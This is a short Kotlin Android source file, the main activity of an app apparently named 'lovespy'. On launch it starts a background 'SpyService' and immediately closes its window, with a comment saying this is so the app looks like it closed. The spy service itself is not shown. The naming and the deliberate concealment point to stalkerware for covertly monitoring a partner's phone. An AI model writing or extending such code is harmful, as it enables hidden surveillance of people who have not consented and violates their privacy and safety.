package com.example.lovespy

import android.content.Context
import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Start the background service immediately
        val intent = android.content.Intent(this, services.SpyService::class.java)
        startForegroundService(intent)
        
        // Finish activity so the app looks like it closed
        finish()
        
        Toast.makeText(this, "Spy Service Started", Toast.LENGTH_SHORT).show()
    }
}
